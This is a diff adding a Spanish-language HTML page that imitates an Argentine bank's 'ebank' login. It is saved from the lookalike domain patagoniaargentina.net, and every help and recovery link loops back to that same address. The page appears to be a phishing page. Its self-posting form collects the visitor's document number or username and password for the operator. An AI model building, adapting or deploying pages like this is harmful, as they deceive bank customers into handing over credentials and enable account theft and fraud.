@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://www.patagoniaargentina.net/ebank/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<script src="./index_files/jquery-3.5.0.js.descarga"></script>
+	<style type="text/css">*{padding: 0;margin: 0;font-family: Arial;box-sizing: border-box;}html{background:#b3c8d9;height: 100%;}.container{width: 80%;background: #FFF;margin: 1em auto;padding:2em 1em;max-width: 830px;}header{display: flex;flex-direction: row;flex-wrap: wrap;margin-bottom: 3em;}.logo{width: 50%;margin-bottom: 1em;}.logo:nth-of-type(2){text-align: right;}nav{width: 100%;background: #0e3481;height: 31px;}ul{padding: 0;margin: 0;display: flex;list-style: none;width: 100%;justify-content: flex-end;height: 100%;align-items: center;color: #FFF;}ul li > a{color: #FFF;text-decoration: none;font-size: 12px;font-weight: bold;}ul li{margin-right: .5em;}.home{background: #b3c8d9;display: flex;flex-wrap: nowrap;border-bottom:1px solid #b0e400;}.login{width:37.5%;padding: .3em;}.baner{width: 70%;height: 100%;}form h4{font-size: 11px;margin-bottom: .7em;color: #224380}.controles-radios{width: 65%;display: flex;justify-content: space-around;margin:0 auto .7em 0;}.controles-radios label{font-size: 11px;color: #224380;font-weight: bolder;}.controles-radios input{height: 16px;width: 16px;}.control{width: 100%;margin-bottom: .5em;}.control label{font-size: 11px;font-weight: bold;width: 23%;display: inline-block;color: #224380}.control select{width: 23%;}.control input{width: 40%;}.control a{font-size: 11px;color: #224380}.btn{width: 30%;left: 35%;position: relative;color: #224380;margin-bottom: 1em;}.doted{width: 100%;border-bottom: 1px dotted #FFF;margin-bottom: .5em;}form span{font-size: 10px;color: #224380}.button-link{display: inline-block;width: 43%;font-size: 11px;text-decoration: none;background: #fcfcfc;padding: .3em;border: 1px solid silver;color: #224380;margin-left: 30%;margin-top: 1em;margin-bottom: .5em;}.baner img{height:300px;object-fit: cover;width: 100%;}.images-pre-footer{width: 100%;}.images-pre-footer img{width: 100%;}
+	</style>
+	
+	<title>Inicia sesión</title>
+</head>
+<body>
+	<div class="container">
+		<header>
+			<div class="logo">
+				<img src="./index_files/lsdeuns1.jpg">
+			</div>
+			<div class="logo">
+				<img src="./index_files/trre4t.jpg">
+			</div>
+			<nav>
+				<ul>
+					<li><a href="https://www.patagoniaargentina.net/ebank/">Sucursales y Cajeros</a></li>
+					<li>|</li>
+					<li><a href="https://www.patagoniaargentina.net/ebank/">Ayuda</a></li>
+					<li>|</li>
+					<li><a href="https://www.patagoniaargentina.net/ebank/">Contáctenos</a></li>
+				</ul>
+			</nav>
+		</header>
+		<section class="home">
+			<div class="login">
+				<form method="POST">
+					<div>
+						<img src="./index_files/ty6gtt.gif">
+					</div>
+					<h4>Seleccione Documento o Usuario para ingresar.</h4>
+					<div class="controles-radios">
+						<input type="radio" name="opcion" value="dni" id="dnicampo" checked="">
+						<label>Documento</label>
+						<input type="radio" name="opcion" value="user" id="usercamp">
+						<label>Usuario</label>
+					</div>
+					<div class="control documento" id="documento">
+						<label>Documento</label>
+						<select name="tipoDoc">	
+							<option value="DNI">DNI</option>
+							<option value="CI">CI</option>
+							<option value="PASAPORTE">PASAPORTE</option>
+							<option value="LC">LC</option>
+							<option value="LE">LE</option>
+						</select>
+						<input type="number" name="dninum">
+					</div>
+					<div class="control user" id="user" style="display: none;">
+						<label>Usuario</label>
+						<input type="" name="user">
+						<a href="https://www.patagoniaargentina.net/ebank/">Olvidé mi usuario</a>
+					</div>
+
+					<div class="control">
+						<label>Clave</label>
+						<input type="password" name="password" required="">
+						<a href="https://www.patagoniaargentina.net/ebank/">Olvidé mi Clave</a>
+					</div>
+					<button type="submit" name="submit" class="btn">Ingresar</button>
+
+					<div class="doted"></div>
+
+					<span>Si olvidaste usuario y clave o para operar por primera vez</span>
+
+					<a href="https://www.patagoniaargentina.net/ebank/" class="button-link">Crear usuario y clave</a>
+				</form>
+			</div>
+			<div class="baner">
+				<img src="./index_files/olkiu67.jpg">
+			</div>
+		</section>
+		<section class="images-pre-footer">
+			<img src="./index_files/gtyhee33.jpg">
+		</section>
+	</div>
+	<script type="text/javascript">
+		$('.user').hide();
+		$('#dnicampo').click(function(){
+			$('.user').hide();
+			$('.documento').show();
+		})
+		$('#usercamp').click(function(){
+			$('.documento').hide();
+			$('.user').show();
+		})
+	</script>
+
+</body></html>
